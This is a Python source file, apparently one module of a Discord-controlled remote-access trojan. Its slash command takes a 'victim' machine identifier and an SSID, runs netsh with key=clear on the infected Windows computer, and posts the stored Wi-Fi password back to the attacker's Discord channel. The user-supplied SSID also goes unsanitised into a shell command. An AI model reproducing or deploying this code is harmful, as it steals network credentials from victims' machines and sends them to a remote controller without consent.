import disnake as discord
from disnake.ext import commands
from datetime import datetime

import os, re, requests
nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"

class WifiPass(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.ip_addr = self.bot.ip_addr
        
    @commands.slash_command( )
    async def wifipass(self, ctx, victim, ssid):
        """Lists specified wifi password
    
        Parameters
        ----------
        victim: Identifier of the affected computer (found via /listvictims).
        ssid: The name of the WIFI
        """
        if str(victim) == str(self.bot.identifier):
            ssid_details = os.popen(f"""netsh wlan show profile "{ssid}" key=clear""").read()
            ciphers = re.findall(r"Cipher\s(.*)", ssid_details)
            ciphers = "/".join([c.strip().strip(":").strip() for c in ciphers])
            key = re.findall(r"Key Content\s(.*)", ssid_details)
            try:
                key = key[0].strip().strip(":").strip()
            except IndexError:
                key = "None"

            await ctx.response.send_message(
                embed=self.bot.genEmbed(
                    f"Wifi password for {ssid}:", datetime.now(), key
                )
            )

def setup(bot: commands.Bot):
    bot.add_cog(WifiPass(bot))